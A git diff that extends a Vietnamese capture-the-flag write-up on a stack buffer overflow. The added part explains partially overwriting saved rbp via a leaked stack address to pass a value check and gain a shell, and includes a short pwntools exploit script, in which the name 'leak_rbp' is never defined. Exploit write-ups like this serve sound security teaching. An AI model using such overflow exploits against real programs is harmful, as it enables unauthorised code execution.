@@ -198,9 +198,32 @@ Nên nạp địa chỉ `rbp = địa chỉ muốn đến - 8 BYTE` thì đích 
 
 ![Alt text](image/buffer-overflow32.png)
 
-Bài này yêu cầu các phần tử v[0] v[1] v[2] bằng các giá trị cố định trong chương trình. Nhưng ta không có khả năng để thay đổi hay ghi đè giá trị mới lên các phần tử của v4. 
+Bài này yêu cầu các phần tử v[0] v[1] v[2] bằng các giá trị cố định trong chương trình. Nhưng ta không có khả năng để thay đổi hay ghi đè giá trị mới lên các phần tử của v4. Thay vào đó ta sẽ tận dụng địa chỉ v4 mà chương trình cho sẵn.
 
 ![Alt text](image/buffer-overflow33.png)
 
 Khi chương trình lấy mảng v4 để kiểm tra thì sẽ truy cập thông qua địa chỉ rbp-offset. Vậy thay vì cố thay đổi giá trị trong phần tử của mảng v4 thì một cách khác là thay đổi địa chỉ trong rbp. Bằng cách này, ta chỉ cần đưa sẵn dữ liệu trùng với yêu cầu rồi chuyển rbp tới địa chỉ vùng nhớ chứa dữ liệu đó.  
 
+![Alt text](image/buffer-overflow34.png)
+
+Bên cạnh địa chỉ v4 ta còn có một lỗi buffer overflow trong hàm get_credential(). Với khả năng ghi đè 2 BYTE lên saved rbp thì có thể chuyển hướng đến các địa chỉ trong Stack. Tận dụng địa chỉ v4 được leak sẵn ta tính được offset đến buffer (có thể là username hay password) rồi ghi đè lên saved rbp.
+
+    p.recvuntil(b'user: ')
+    stack_leak=int(p.recvline(),16)
+    log.info('Stack_leak: '+hex(stack_leak))
+
+    leak_pass=stack_leak-0x50
+    fake_saved_rbp=leak_rbp+0x20
+
+    input()
+    payload=b'A'*32
+    payload+=p64(leak_pass)[0:2]
+    p.sendafter(b'Username: ',payload)
+
+    input()
+    payload=p64(0x13371337)
+    payload+=p64(0xDEADBEEF)
+    payload+=p64(0xCAFEBABE)
+    p.sendafter(b'Password: ',payload)
+
+Việc cuối cùng cần làm là nạp payload chứa địa chỉ saved rbp giả và payload chứa dữ liệu bypass điều kiện if để tạo shell.
